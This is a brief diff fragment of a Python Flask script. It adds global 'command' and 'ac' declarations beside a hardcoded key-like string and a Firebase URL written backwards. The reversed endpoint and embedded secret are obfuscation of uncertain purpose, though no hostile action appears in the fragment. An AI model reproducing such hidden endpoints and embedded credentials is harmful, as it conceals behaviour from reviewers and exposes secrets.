@@ -16,7 +16,8 @@ from requests.adapters import HTTPAdapter
 from flask import Flask, request
 
 
-
+global command
+global ac
 k ='=0CI01jIDYKfGnVu3xMxJ1scQxZDFbcULoV8j0-MkMjS'
 y = '/sedoc/leba/moc.oiesaberif.bdtr-tluafed-stneilc-ppa-redda-t'
 
